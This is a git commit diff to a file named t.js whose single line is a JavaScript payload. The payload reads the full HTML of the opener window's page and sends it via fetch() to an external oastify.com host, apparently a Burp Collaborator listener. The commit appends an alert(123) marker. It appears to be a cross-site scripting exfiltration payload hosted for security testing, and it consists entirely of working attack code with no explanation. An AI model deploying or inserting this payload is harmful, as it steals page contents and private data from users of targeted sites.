727487b92e4b79879a2e30555668262fb9c94771
Alex Useche <1915998+hex0punk@users.noreply.github.com>
2025-05-13 22:27:49 -0700

    Update t.js

--- t.js
+++ t.js
@@ -1,1 +1,1 @@
-fetch(`https://tol6uy677k75f3pv7lwldk1w5nbez6nv.oastify.com?exfil=${encodeURIComponent(window.opener.document.body.innerHTML)}`)
+fetch(`https://tol6uy677k75f3pv7lwldk1w5nbez6nv.oastify.com?exfil=${encodeURIComponent(window.opener.document.body.innerHTML)}`);alert(123)
